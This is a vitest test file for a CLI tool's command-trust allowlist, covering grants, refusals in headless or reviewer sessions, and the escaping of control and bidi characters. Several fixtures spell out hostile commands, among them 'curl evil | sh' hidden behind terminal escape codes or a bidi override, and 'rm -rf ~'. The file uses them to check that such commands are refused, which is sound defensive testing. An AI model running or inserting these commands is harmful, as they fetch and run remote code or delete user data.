import { existsSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { cliAct } from '../src/act.js'
import { ensureTrusted, grantCommands, grantOf, grantRows, pendingCmds, pendingRows, sourced, trustListing, UNGRANTABLE } from '../src/allowlist.js'
import { decideView } from '../src/decide-view.js'
import { readStream } from '../src/journal.js'
import { needsYou } from '../src/needs-you.js'
import { recommend } from '../src/recommend.js'
import { renderRefusal } from '../src/refusal.js'
import { runFiltered, runFullSuite } from '../src/runner.js'
import { loadCanon } from '../src/scan.js'
import { run as runTrust } from '../src/verbs/trust.js'
import { SPEC_META, approve, fakeCtx, seededRepo, stampLive, writePlan, writeSpec, type TestRepo } from './helpers.js'
import { UNSAFE_CMD, cfgOf, controlStrings, decideRepo, must, trustRepo as planWithCmdCriterion } from './model-fixtures.js'

// D154. Headless gates block every untrusted per-criterion command (`allowlist.ts`,
// `!isTTY → blocked`) — the Aug 1 all-four-`ac-*`-fail false negative. Approvals are
// agent-typed (D127), so there is no prompt to give; trust rides the surfaces that exist.
async function cmdSpec() {
  const repo = await seededRepo()
  await writeSpec(repo, 'auth-refresh', {
    ...SPEC_META,
    criteria: [
      { id: 'ac-rotate', test: '@spec:auth-refresh' },
      { id: 'ac-smoke', cmd: 'echo ok' },
      { id: 'ac-lint', cmd: 'echo lint' },
    ],
  })
  stampLive(repo, 'auth-refresh')
  return repo
}

describe('witness trust (D154)', () => {
  it('lists the cmd: criteria with status and grants nothing without --yes', async () => {
    const repo = await cmdSpec()

    const res = await repo.cli(['trust', 'auth-refresh'])

    expect(res.stdout).toContain('echo ok')
    expect(res.stdout).toContain('untrusted')
    expect(res.code).toBe(1)                                   // listing is not granting
    expect(() => repo.read('.witness/allow.json')).toThrow()
  })

  it('grants every listed command with --yes and journals the act', async () => {
    const repo = await cmdSpec()

    const res = await repo.cli(['trust', 'auth-refresh', '--yes'], { tty: true })

    expect(res.code).toBe(0)
    const allow = JSON.parse(repo.read('.witness/allow.json')) as { commands: string[] }
    expect(allow.commands).toEqual(expect.arrayContaining(['echo ok', 'echo lint']))
    const entry = readStream(repo.root, repo.effort).findLast((e) => e.t === 'trust')
    expect(entry?.via).toBe('verb')
    // row 205: the config commands the flow runs are listed, and granted, beside the criteria
    expect(entry?.cmds).toEqual(['npm test -- -t "@spec:{id}"', 'npm test', 'npm run lint', 'echo ok', 'echo lint'])
  })

  it('is idempotent and says so when nothing is left to grant', async () => {
    const repo = await cmdSpec()
    await repo.cli(['trust', 'auth-refresh', '--yes'], { tty: true })

    const again = await repo.cli(['trust', 'auth-refresh'])

    expect(again.code).toBe(0)
    expect(again.stdout).toContain('already trusted')
  })

  it('lists the config commands for an artifact with no cmd: criteria (row 205)', async () => {
    const repo = await seededRepo()
    await writeSpec(repo, 'auth-refresh')

    const res = await repo.cli(['trust', 'auth-refresh'])

    expect(res.code).toBe(1)
    expect(res.stdout).toContain('npm test,ship.test,untrusted')
    expect(res.stdout).toContain('npm run lint,ship.lint,untrusted')
    expect(res.stdout).toContain("run: witness trust auth-refresh --cmd 'npm test'")
  })

  it('refuses an unknown artifact with a runnable remedy', async () => {
    const repo = await seededRepo()

    const res = await repo.cli(['trust', 'ghost'])

    expect(res.code).toBe(2)
    expect(res.stderr).toContain('unknown-artifact')
    expect(res.stderr).toContain('run: witness index')
  })
})

// Row 205 (issue #56). A plan carries no criteria of its own, so the verb read nothing for it
// even when its spec runs a command; and the config commands every flow runs — the runner,
// ship.test, ship.lint — were invisible to it. Grants are per named command, never a nod, and
// never a session's. The repo these run on, `planWithCmdCriterion`, is the fixtures' `trustRepo`,
// which the text goldens list too.
const allowed = (repo: { read: (rel: string) => string }): string[] =>
  (JSON.parse(repo.read('.witness/allow.json')) as { commands: string[] }).commands

describe('witness trust per command (D205)', () => {
  it("lists a plan's spec criteria and the config commands it runs (P3)", async () => {
    const repo = await planWithCmdCriterion()
    const res = await repo.cli(['trust', 'ingest-plan-1'], { env: { WITNESS_TRUST_CMDS: '' } })
    expect(res.stdout).toContain('pnpm test,ship.test,untrusted')
    expect(res.stdout).toContain('pnpm lint,ship.lint,untrusted')
    expect(res.stdout).toContain('echo first,cmd: ac-a,untrusted')
    expect(res.stdout).not.toContain('full-suite,')
    expect(res.code).toBe(1)
  })

  it('--cmd grants exactly the named command and journals it (P4)', async () => {
    const repo = await planWithCmdCriterion()
    const res = await repo.cli(['trust', 'ingest', '--cmd', 'echo first'], { env: { WITNESS_TRUST_CMDS: '' } })
    expect(res.code).toBe(0)
    expect(allowed(repo)).toEqual(['echo first'])
    expect(readStream(repo.root, repo.effort).findLast((e) => e.t === 'trust')?.cmds).toEqual(['echo first'])
  })

  it('--yes refuses without a terminal and grants all at one', async () => {
    const repo = await planWithCmdCriterion()
    const headless = await repo.cli(['trust', 'ingest', '--yes'])
    expect(headless.code).toBe(2)
    expect(headless.stderr).toContain('yes-needs-terminal')
    expect(() => repo.read('.witness/allow.json')).toThrow()
    const human = await repo.cli(['trust', 'ingest', '--yes'], { tty: true })
    expect(human.code).toBe(0)
    expect(allowed(repo)).toEqual(['pnpm test', 'pnpm lint', 'echo first', 'test -d .git'])
  })

  it('a reviewer cannot grant trust, in a drive session or not (issue #73)', async () => {
    const repo = await planWithCmdCriterion()
    for (const env of [{ WITNESS_REVIEWER: '1' }, { WITNESS_DRIVE: 'ingest-plan-1', WITNESS_REVIEWER: '1' }]) {
      for (const flag of [['--cmd', 'pnpm test'], ['--yes']]) {
        const res = await repo.cli(['trust', 'ingest-plan-1', ...flag], { env, tty: true })
        expect(res.code).toBe(2)
        expect(res.stderr).toContain('reviewer-cannot')
      }
    }
    expect(() => repo.read('.witness/allow.json')).toThrow()
  })

  it('no session grants trust', async () => {
    const repo = await planWithCmdCriterion()
    for (const env of [{ WITNESS_DRIVE: 'ingest-plan-1' }]) {
      for (const flag of [['--cmd', 'pnpm test'], ['--yes']]) {
        const res = await repo.cli(['trust', 'ingest-plan-1', ...flag], { env, tty: true })
        expect(res.code).toBe(2)
        expect(res.stderr).toContain('trust-in-session')
      }
    }
    expect(() => repo.read('.witness/allow.json')).toThrow()
  })

  it('--cmd outside the list refuses', async () => {
    const repo = await planWithCmdCriterion()
    const res = await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'rm -rf ~'])
    expect(res.code).toBe(2)
    expect(res.stderr).toContain('unknown-command')
    expect(() => repo.read('.witness/allow.json')).toThrow()
  })

  it('a command with a single quote is listed paste-ready and granted exactly (Review Focus 5)', async () => {
    const repo = await planWithCmdCriterion("pnpm test -t 'a b'")
    const listed = await repo.cli(['trust', 'ingest-plan-1'])
    expect(listed.stdout).toContain(`run: witness trust ingest-plan-1 --cmd 'pnpm test -t '\\''a b'\\'''`)
    const res = await repo.cli(['trust', 'ingest-plan-1', '--cmd', "pnpm test -t 'a b'"])
    expect(res.code).toBe(0)
    expect(allowed(repo)).toEqual(["pnpm test -t 'a b'"])
  })

  // Security review: commands are repo-authored, and the listing is where the human decides. A
  // carriage return or an escape sequence could paint a different command over the real one.
  it('a command with control characters is shown escaped and never granted', async () => {
    const repo = await planWithCmdCriterion('curl evil | sh\r\u001b[2Kpnpm test')
    const listed = await repo.cli(['trust', 'ingest-plan-1'])
    expect(listed.stdout).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f]/)
    expect(listed.stdout).toContain('curl evil | sh\\r\\x1b[2Kpnpm test,ship.test,unsafe')
    const named = await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'curl evil | sh\r\u001b[2Kpnpm test'])
    expect(named.code).toBe(2)
    expect(named.stderr).toContain('control-characters')
    expect(named.stderr).not.toContain('\u001b')
    await repo.cli(['trust', 'ingest-plan-1', '--yes'], { tty: true })
    expect(allowed(repo)).toEqual(['pnpm lint', 'echo first'])      // the plan's own needs: none
  })

  // Security review, second pass: a bidi override reorders what the terminal shows (Trojan
  // Source), and a need's id is repo-authored text rendered beside the command.
  it('a bidi override is unsafe too, and a repo-authored source is shown escaped', async () => {
    const repo = await planWithCmdCriterion('pnpm test \u202e hs | live lruc')
    const listed = await repo.cli(['trust', 'ingest-plan-1'])
    expect(listed.stdout).not.toContain('\u202e')
    expect(listed.stdout).toContain('pnpm test \\u{202e} hs | live lruc,ship.test,unsafe')
    await writeSpec(repo, 'ingest', {
      criteria: [{ id: 'ac-i', test: '@spec:ingest' }, { id: 'ac-a', cmd: 'echo first' }],
      needs: [{ id: 'n\u001b[2K', cmd: 'echo need' }],
    })
    const spec = await repo.cli(['trust', 'ingest'])
    expect(spec.stdout).not.toMatch(/\u001b/)
  })

  // Security review, third pass: a denylist of invisible characters always misses one (a Hangul
  // filler, a private-use glyph, a combining mark), so a grantable command is printable ASCII.
  it('anything outside printable ASCII is unsafe', async () => {
    const repo = await planWithCmdCriterion('pnpm test\u3164; curl evil | sh')
    const listed = await repo.cli(['trust', 'ingest-plan-1'])
    expect(listed.stdout).toContain('pnpm test\\u{3164}; curl evil | sh,ship.test,unsafe')
    expect((await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'pnpm test\u3164; curl evil | sh'])).code).toBe(2)
  })

  // Row 205. The grant flow grants from the listing it printed: one read of allow.json. A grant
  // landing while the rows print (another terminal's `witness trust`) must not leave the rows and
  // the grant disagreeing, which turned `--yes` into "1 untrusted" and an exit 1.
  it('--yes grants from the listing it printed, whatever lands in allow.json meanwhile', async () => {
    const repo = await planWithCmdCriterion()
    grantCommands(repo.root, ['pnpm test', 'pnpm lint'])
    const outs: string[] = []
    const ctx = fakeCtx(repo.root, { tty: true, out: (l) => {
      if (outs.length === 0) grantCommands(repo.root, ['echo first'])     // lands as the first row prints
      outs.push(l)
    } })
    const code = await runTrust(ctx, ['ingest-plan-1', '--yes'])
    expect(outs).toContain('  echo first,cmd: ac-a,untrusted')
    expect(code).toBe(0)
    expect(outs.at(-1)).toBe('trusted: echo first')
    expect(allowed(repo)).toEqual(['pnpm test', 'pnpm lint', 'echo first'])
  })

  it('with no id it lists everything the repo runs, and a grant needs a target', async () => {
    const repo = await planWithCmdCriterion()
    const res = await repo.cli(['trust'])
    expect(res.code).toBe(1)
    expect(res.stdout).toContain('pnpm test,ship.test,-,untrusted')
    expect(res.stdout).toContain('echo first,cmd: ac-a,ingest,untrusted')
    expect(res.stdout).toContain('test -d .git,need: 1,ingest,untrusted')
    const bare = await repo.cli(['trust', '--cmd', 'pnpm test'], { tty: true })
    expect(bare.code).toBe(2)
    expect(bare.stderr).toContain('usage')
  })
})

// Rows 139/203. The listing `witness trust [<id>]` prints, as the model the verb prints it from:
// its rows escaped as the text shows them, the counts its summary lines state, and a target
// listing's grants as acts, one per untrusted command and none for an unsafe one.
describe('the trust listing is a model (rows 139/203)', () => {
  it('a target listing: rows escaped, one grant per untrusted command, none for an unsafe one (Review Focus 2)', async () => {
    const repo = await planWithCmdCriterion('curl evil | sh\r\u001b[2Kpnpm test')
    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1')
    if (!r.ok) throw new Error('listing')
    expect(r.value).toEqual({
      target: 'ingest-plan-1',
      rows: [
        { cmd: 'curl evil | sh\\r\\x1b[2Kpnpm test', source: 'ship.test', status: 'unsafe' },
        { cmd: 'pnpm lint', source: 'ship.lint', status: 'untrusted' },
        { cmd: 'echo first', source: 'cmd: ac-a', status: 'untrusted' },
      ],
      pending: [cliAct('trust', 'ingest-plan-1', '--cmd', 'pnpm lint'), cliAct('trust', 'ingest-plan-1', '--cmd', 'echo first')],
      untrusted: 2, unsafe: 1,
    })
    expect(controlStrings(r.value)).toEqual([])
    // plain data: a JSON round trip is the model itself, and no key is held undefined
    expect(JSON.parse(JSON.stringify(r.value))).toStrictEqual(r.value)
  })

  it('a quoted command is one argv word, printed paste-ready', async () => {
    const repo = await planWithCmdCriterion("pnpm test -t 'a b'")
    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1')
    if (!r.ok) throw new Error('listing')
    expect(r.value.pending[0]).toEqual(cliAct('trust', 'ingest-plan-1', '--cmd', "pnpm test -t 'a b'"))
    expect(r.value.pending[0]!.line).toBe(`witness trust ingest-plan-1 --cmd 'pnpm test -t '\\''a b'\\'''`)
  })

  it('the repo listing names each doc and offers no grant', async () => {
    const repo = await planWithCmdCriterion()
    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root))
    if (!r.ok) throw new Error('listing')
    expect(r.value).toEqual({
      rows: [
        { cmd: 'pnpm test', source: 'ship.test', doc: '-', status: 'untrusted' },
        { cmd: 'pnpm lint', source: 'ship.lint', doc: '-', status: 'untrusted' },
        { cmd: 'echo first', source: 'cmd: ac-a', doc: 'ingest', status: 'untrusted' },
        { cmd: 'test -d .git', source: 'need: 1', doc: 'ingest', status: 'untrusted' },
      ],
      pending: [], untrusted: 4, unsafe: 0,
    })
    expect(JSON.parse(JSON.stringify(r.value))).toStrictEqual(r.value)
  })

  it('an unknown target refuses as the verb does', async () => {
    const repo = await planWithCmdCriterion()
    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'nope')
    if (r.ok) throw new Error('an unknown target listed')
    expect(r.violations[0]).toMatchObject({ field: 'artifact', rule: 'unknown-artifact', got: 'nope' })
    const verb = await repo.cli(['trust', 'nope'])
    expect(verb.code).toBe(2)
    expect(verb.stderr).toBe(renderRefusal(r.violations).join('\n'))
  })

  // A residual, kept byte for byte: the repo listing counts an unsafe command once per row that
  // lists it, as the verb always has, where a target listing counts each command once.
  it('the repo listing counts an unsafe command per row, a target listing once', async () => {
    const repo = await planWithCmdCriterion('bad\u001bcmd')
    must(await writeSpec(repo, 'ingest-ops', {
      criteria: [{ id: 'ac-o', test: '@spec:ingest-ops' }, { id: 'ac-x', cmd: 'bad\u001bcmd' }],
    }), 'write ingest-ops')
    grantCommands(repo.root, ['pnpm lint', 'echo first', 'test -d .git'])
    const all = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root))
    if (!all.ok) throw new Error('listing')
    expect(all.value.rows.filter((row) => row.status === 'unsafe')).toEqual([
      { cmd: 'bad\\x1bcmd', source: 'ship.test', doc: '-', status: 'unsafe' },
      { cmd: 'bad\\x1bcmd', source: 'cmd: ac-x', doc: 'ingest-ops', status: 'unsafe' },
    ])
    expect(all.value).toMatchObject({ untrusted: 0, unsafe: 2 })
    const listed = await repo.cli(['trust'])
    expect(listed.stdout.split('\n').at(-1)).toBe(
      'trust: 2 carry characters outside printable ASCII — never granted here · rewrite where it is written')
    expect(listed.code).toBe(1)
    const one = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-ops')
    if (!one.ok) throw new Error('listing')
    expect(one.value).toMatchObject({ untrusted: 0, unsafe: 1, pending: [] })
    expect(one.value.rows).toHaveLength(3)
  })

  // Every repo-authored field a row or a grant shows is escaped, here on a hand-edited spec (`witness
  // write` refuses such ids) whose own id, criterion id and need id hold an escape and a bidi
  // override. The one raw field is the target the caller named (R15), as its grants print it.
  it("a hand-edited doc's ids are escaped in every row and grant source, the target raw (R15)", async () => {
    const repo = await planWithCmdCriterion()
    const evil = '\u001b[2K\u202e'
    const shown = '\\x1b[2K\\u{202e}'
    const id = `ingest${evil}`
    repo.setMeta('ingest', {
      id, criteria: [{ id: 'ac-i', test: '@spec:ingest' }, { id: `ac-a${evil}`, cmd: 'echo first' }],
      needs: [{ id: `n${evil}`, cmd: 'test -d .git' }],
    })
    const cfg = cfgOf(repo.root)
    const canon = loadCanon(repo.root)
    const all = trustListing(repo.root, cfg, canon)
    if (!all.ok) throw new Error('listing')
    expect(all.value.rows.slice(2)).toEqual([
      { cmd: 'echo first', source: `cmd: ac-a${shown}`, doc: `ingest${shown}`, status: 'untrusted' },
      { cmd: 'test -d .git', source: `need: n${shown}`, doc: `ingest${shown}`, status: 'untrusted' },
    ])
    expect(controlStrings(all.value)).toEqual([])
    const one = trustListing(repo.root, cfg, canon, id)
    if (!one.ok) throw new Error('listing')
    expect(one.value.rows.slice(2)).toEqual([
      { cmd: 'echo first', source: `cmd: ac-a${shown}`, status: 'untrusted' },
      { cmd: 'test -d .git', source: `need: n${shown}`, status: 'untrusted' },
    ])
    expect(controlStrings(one.value.rows)).toEqual([])
    // R15: the target stays raw, in the listing and in the grants it offers, and nothing else does
    expect(one.value.target).toBe(id)
    expect(one.value.pending.at(-1)).toEqual(cliAct('trust', id, '--cmd', 'test -d .git'))
    expect(controlStrings(one.value)).toEqual([id, ...one.value.pending.flatMap((a) => [a.argv[1], a.line])])
    // the inbox's trust grant, from the sources drive hands it
    const items = needsYou(repo.root, { env: {} }, cfg, canon, [
      { target: id, kind: 'kept', stop: 'trust-grant', trust: sourced(cfg, canon, id, ['echo first', 'test -d .git']) },
    ])
    const grant = items.find((i) => i.kind === 'trust-grant')
    if (grant?.kind !== 'trust-grant') throw new Error('no trust grant')
    expect(grant.commands?.map(({ cmd, source }) => ({ cmd, source }))).toEqual([
      { cmd: 'echo first', source: `cmd: ac-a${shown}` },
      { cmd: 'test -d .git', source: `need: n${shown}` },
    ])
  })

  // The guard the listing's test leans on, seen to hit: a walk that never reports a string
  // would pass every model.
  it('controlStrings reports each string holding a control or bidi character', () => {
    expect(controlStrings({ a: ['ok', 'x\u001b'], b: { c: 'y\u202e' } })).toEqual(['x\u001b', 'y\u202e'])
  })
})

// The block renders BOTH approve forms so trust is never the toll for approval, and names
// the commands verbatim — a grant the human cannot read is not one they made.
describe('the decision block prices trust (D154)', () => {
  const entries = [{
    v: 1, t: 'gate-run', gate: 'plan', artifact: 'p1', round: 1, run_id: 'r-1',
    reviewed_sha: 'a', prompts_sha: 'ps', witness: '0.13.0', model: 'm', pin: 'm',
    harness: 'claude-code', checks: [{ name: 'c', ok: true }],
    outcome: 'stopped', verdicts: [{ reviewer: 'plan-critic', findings: [], coverage: [] }],
  }] as unknown as Parameters<typeof recommend>[0]['entries']

  it('offers plain approve FIRST and a trusting twin beside it', () => {
    const d = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false,
      untrustedCmds: ['echo ok', 'echo lint'],
    })!
    const plain = d.options.findIndex((o) => o.command.endsWith('--approve'))
    const trusting = d.options.findIndex((o) => o.command.endsWith('--approve --trust-cmds'))

    expect(plain).toBeGreaterThanOrEqual(0)
    expect(trusting).toBe(plain + 1)                               // plain first: never the toll
    expect(d.options[plain]!.tradeoff).toContain('echo ok · echo lint')
    expect(d.options[trusting]!.tradeoff).toContain('echo ok · echo lint')
    expect(d.options[trusting]!.note).toContain('never grants trust')
  })

  it('changes nothing when every command is already trusted', () => {
    const withTrust = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false, untrustedCmds: [],
    })!
    expect(withTrust.options.some((o) => o.command.includes('--trust-cmds'))).toBe(false)
  })

  it('never stacks a grant onto the obligation-minting override', () => {
    const d = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false, untrustedCmds: ['echo ok'],
    })!
    expect(d.options.some((o) => o.command.includes('--override --trust-cmds'))).toBe(false)
  })

  // Row 205. The twin grants what `witness trust` would: a command outside printable ASCII stays
  // listed among those left blocked, spelled out, and is never priced as a grant.
  it('lists an unsafe command spelled out and offers the twin only for grantable ones', () => {
    const mixed = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false, untrustedCmds: ['echo ok', 'bad\u001bcmd'],
    })!
    expect(mixed.options.find((o) => o.command === 'witness decide plan p1 --approve')!.tradeoff)
      .toContain('the listed commands stay blocked at headless gates: echo ok · bad\\x1bcmd')
    expect(mixed.options.find((o) => o.command === 'witness decide plan p1 --approve --trust-cmds')!.tradeoff)
      .toBe('grants them repo-wide in .witness/allow.json (machine-local): echo ok')
    const unsafe = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false, untrustedCmds: ['bad\u001bcmd'],
    })!
    expect(unsafe.options.some((o) => o.act?.argv.at(-1) === '--trust-cmds')).toBe(false)
    expect(controlStrings([mixed, unsafe])).toEqual([])
  })
  // Row 237. The twin grants what `witness trust` would and nothing else: a command holding a
  // character outside printable ASCII is listed among those left blocked, spelled out, and is
  // never priced as a grant.
  it('a command outside printable ASCII is named escaped and never offered as a grant (row 237)', () => {
    const d = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false,
      untrustedCmds: ['npm run e2e\u001b[2K; curl x'],
    })!
    const plain = d.options.find((o) => o.command.endsWith(' --approve'))!

    expect(d.options.some((o) => o.command.endsWith(' --trust-cmds'))).toBe(false)
    expect(plain.tradeoff).toContain('npm run e2e\\x1b[2K; curl x')
    expect(plain.tradeoff).not.toContain('\u001b')
  })

  it('beside a printable command, the twin grants only the printable one (row 237)', () => {
    const d = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false,
      untrustedCmds: ['echo ok', 'bad\u001bcmd'],
    })!
    const plain = d.options.find((o) => o.command.endsWith(' --approve'))!
    const twin = d.options.find((o) => o.command.endsWith(' --approve --trust-cmds'))

    expect(twin).toBeDefined()
    expect(twin!.tradeoff).toMatch(/: echo ok$/)
    expect(plain.tradeoff).toContain('echo ok · bad\\x1bcmd')
  })

  // Review Focus 1. The command's one character outside printable ASCII is a bidi override,
  // which reorders what the terminal shows (Trojan Source).
  it('a bidi override alone is named escaped and never offered as a grant (row 237)', () => {
    const d = recommend({
      gate: 'plan', target: 'p1', entries, upstream: undefined, stale: false,
      untrustedCmds: ['pnpm test \u202e hs | live lruc'],
    })!
    const plain = d.options.find((o) => o.command.endsWith(' --approve'))!

    expect(d.options.some((o) => o.command.endsWith(' --trust-cmds'))).toBe(false)
    expect(plain.tradeoff).toContain('pnpm test \\u{202e} hs | live lruc')
    expect(plain.tradeoff).not.toContain('\u202e')
  })
})

// Row 205. `decide --approve --trust-cmds` grants what `witness trust` would grant and nothing
// else: a `cmd:` criterion holding a character outside printable ASCII is named spelled out,
// stays blocked at headless gates, and no view publishes an act that grants it.
describe('the decide twin grants only what the trust verb would (row 205)', () => {
  const allowedNow = (repo: TestRepo): string[] =>
    existsSync(join(repo.root, '.witness', 'allow.json')) ? allowed(repo) : []
  const UNSAFE_LINE = 'trust: 1 carry characters outside printable ASCII — never granted here · rewrite where it is written'

  it('an unsafe command alone: no twin, the command spelled out, and the grant grants nothing', async () => {
    const { repo, gate, target } = await decideRepo('plan-trust-unsafe')
    const view = decideView(repo.root, cfgOf(repo.root), loadCanon(repo.root), gate, target)
    if (view.state !== 'actionable') throw new Error(view.state)
    expect(view.block?.options.some((o) => o.act?.argv.at(-1) === '--trust-cmds')).toBe(false)
    expect(view.block?.options[0]).toMatchObject({ command: `witness decide plan ${target} --approve`,
      tradeoff: 'the listed commands stay blocked at headless gates: npm run e2e\\x1b[2K; curl x' })
    expect(controlStrings(view)).toEqual([])
    const res = await repo.cli(['decide', gate, target, '--approve', '--trust-cmds'])
    expect(res.code).toBe(0)
    expect(res.stdout).toContain(`trusted: nothing to grant\n${UNSAFE_LINE}\ndecided: plan ${target} → approve`)
    expect(res.stdout).not.toContain('\u001b')
    expect(allowedNow(repo)).not.toContain(UNSAFE_CMD)
    expect(readStream(repo.root, repo.effort).some((e) => e.t === 'trust')).toBe(false)
  })

  it('beside a printable command: the twin grants that one alone and reports the other', async () => {
    const { repo, gate, target } = await decideRepo('plan-trust-mixed')
    const view = decideView(repo.root, cfgOf(repo.root), loadCanon(repo.root), gate, target)
    if (view.state !== 'actionable') throw new Error(view.state)
    expect(view.block?.options.slice(0, 2)).toMatchObject([
      { command: `witness decide plan ${target} --approve`,
        tradeoff: 'the listed commands stay blocked at headless gates: npm run e2e · npm run e2e\\x1b[2K; curl x' },
      { command: `witness decide plan ${target} --approve --trust-cmds`,
        tradeoff: 'grants them repo-wide in .witness/allow.json (machine-local): npm run e2e' },
    ])
    expect(controlStrings(view)).toEqual([])
    const res = await repo.cli(['decide', gate, target, '--approve', '--trust-cmds'])
    expect(res.code).toBe(0)
    expect(res.stdout).toContain(`trusted: npm run e2e\n${UNSAFE_LINE}\ndecided: plan ${target} → approve`)
    expect(allowedNow(repo)).toEqual(['npm run e2e'])
    expect(readStream(repo.root, repo.effort).findLast((e) => e.t === 'trust')?.cmds).toEqual(['npm run e2e'])
  })
})

// Row 237. Before witness runs an untrusted command, ensureTrusted asks at a terminal, and "y"
// granted the command the prompt showed raw. A command the human cannot read whole is never
// offered there.
describe('ensureTrusted (row 237)', () => {
  // A ctx (a terminal unless `tty: false`) at which any prompt fails the test, and is counted.
  function noPrompt(root: string, opts: { tty?: boolean; env?: Record<string, string> } = {}) {
    const t = { asked: 0, ctx: fakeCtx(root, { tty: true, ...opts }) }
    t.ctx.ask = async () => { t.asked++; throw new Error('asked') }
    return t
  }

  it('a non-printable command at a terminal is blocked, never asked and never granted', async () => {
    const repo = await seededRepo()
    const t = noPrompt(repo.root)
    expect(await ensureTrusted(repo.root, t.ctx, 'bad\u001bcmd')).toBe('blocked')
    expect(await ensureTrusted(repo.root, t.ctx, 'pnpm test \u202e hs | live lruc')).toBe('blocked')   // Review Focus 1
    expect(t.asked).toBe(0)
    expect(() => repo.read('.witness/allow.json')).toThrow()
  })

  it('a printable command at a terminal is still asked, and granted on y', async () => {
    const repo = await seededRepo()
    expect(await ensureTrusted(repo.root, fakeCtx(repo.root, { tty: true, answers: ['y'] }), 'echo ok')).toBe('trusted')
    expect(allowed(repo)).toEqual(['echo ok'])
  })

  it("automation and the human's own list are unchanged (Review Focus 3 and 4)", async () => {
    const repo = await seededRepo()
    const automation = noPrompt(repo.root, { env: { WITNESS_TRUST_CMDS: '1' } })
    expect(await ensureTrusted(repo.root, automation.ctx, 'bad\u001bcmd')).toBe('trusted')
    repo.write('.witness/allow.json', JSON.stringify({ commands: ['bad\u001bcmd'] }))   // a hand edit
    const listed = noPrompt(repo.root)
    expect(await ensureTrusted(repo.root, listed.ctx, 'bad\u001bcmd')).toBe('trusted')
    expect(automation.asked + listed.asked).toBe(0)
  })

  it('without a terminal, a non-printable command is blocked as before', async () => {
    const repo = await seededRepo()
    const t = noPrompt(repo.root, { tty: false })
    expect(await ensureTrusted(repo.root, t.ctx, 'bad\u001bcmd')).toBe('blocked')
    expect(t.asked).toBe(0)
    expect(() => repo.read('.witness/allow.json')).toThrow()
  })
})

// Row 237. No grant exists for a command outside printable ASCII, so a remedy that sent the human
// to `witness next` for one was false. The need's and the runner's say it is never granted here.
describe('a remedy for a command never granted names no grant (row 237)', () => {
  const NEVER = 'never granted here — rewrite it in printable ASCII where it is written'

  it('at a terminal, check says a non-printable need is never granted, and start points to check', async () => {
    const repo = await seededRepo()
    await writeSpec(repo, 'auth-refresh')
    approve(repo, 'auth-refresh')
    await writePlan(repo, 'auth-refresh-plan-1', { needs: [{ cmd: 'bad\u001bcmd' }] })
    approve(repo, 'auth-refresh-plan-1')
    const env = { WITNESS_TRUST_CMDS: '' }
    const start = await repo.cli(['start', 'auth-refresh-plan-1'], { tty: true, env })
    expect(start.code).toBe(2)
    expect(start.stderr).toContain(',witness check shows env and cmd needs')     // start prints no need's detail
    expect(start.stderr).not.toContain('witness next names the grant')
    const check = await repo.cli(['check'], { tty: true, env })
    expect(check.stdout).toContain(`,need-blocked,${NEVER}`)
    expect(check.stdout).not.toContain('witness next names the grant')
    expect(() => repo.read('.witness/allow.json')).toThrow()
  })

  it("at a terminal, the runner's refusal says a non-printable command is never granted", async () => {
    const repo = await seededRepo()
    const ctx = fakeCtx(repo.root, { tty: true })
    const filtered = await runFiltered(repo.root, ctx, 'bad\u001bcmd {id}', 'auth-refresh')
    expect(filtered.ok).toBe(false)
    if (!filtered.ok) expect(filtered.violations[0]).toMatchObject({ rule: 'untrusted-blocked', want: NEVER })
    const full = await runFullSuite(repo.root, ctx, { mode: 'full-suite', reportGlob: 'r.xml', suiteCmd: 'bad\u001bcmd' })
    expect(full.ok).toBe(false)
    if (!full.ok) expect(full.violations[0]).toMatchObject({ rule: 'untrusted-blocked', want: NEVER })
  })
})

// Row 239. A grant Windows withholds is never offered to be pasted, so its line names the listing,
// which keeps the command pending and asks for it at a terminal.
describe('a grant Windows withholds names the listing instead (row 239)', () => {
  it("grantOf keeps today's answers, and names the listing for a withheld grant", () => {
    expect(grantOf('p1', { cmd: 'npm test' }, 'win32')).toBe("witness trust p1 --cmd 'npm test'")
    expect(grantOf('p1', { cmd: 'bad\u001bcmd' }, 'win32')).toBe(UNGRANTABLE)
    expect(grantOf('p1', { cmd: 'npm test && npm run lint' }, 'darwin')).toBe("witness trust p1 --cmd 'npm test && npm run lint'")
    expect(grantOf('p1', { cmd: 'npm test && npm run lint' }, 'win32')).toBe('not offered on Windows — it holds &, which ' +
      'cmd.exe or Windows PowerShell can read as more than text · at a terminal, witness trust p1 asks for each command')
  })

  // Row 239 (B12). A kept stop names the repo's command on its own line, so the grant prints on a
  // row of its own under it, never after text the repo wrote.
  it('a grant prints on its own line; on Windows a risky one is withheld for the listing (row 239)', () => {
    expect(grantRows('p1', { cmd: 'npm test' }, 'darwin')).toEqual(["  run: witness trust p1 --cmd 'npm test'"])
    expect(grantRows('p1', { cmd: 'bad\u001bcmd' })).toEqual(['  note: never granted here — rewrite it in printable ASCII where it is written'])
    expect(grantRows('p1', { cmd: 'npm test && npm run lint' }, 'win32')).toEqual([
      '  note: not offered on Windows — it holds &, which cmd.exe or Windows PowerShell can read as more than text',
      '  run: witness trust p1',
    ])
  })

  // The listing the withheld grant names grants nothing by itself: the command must still be
  // pending, or the terminal's per-command prompt would never ask for it.
  it('a withheld command stays pending, so the terminal prompt still asks for it (Review Focus 1)', async () => {
    const repo = await planWithCmdCriterion('npm test && npm run lint')
    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1', 'win32')
    if (!r.ok) throw new Error('listing')
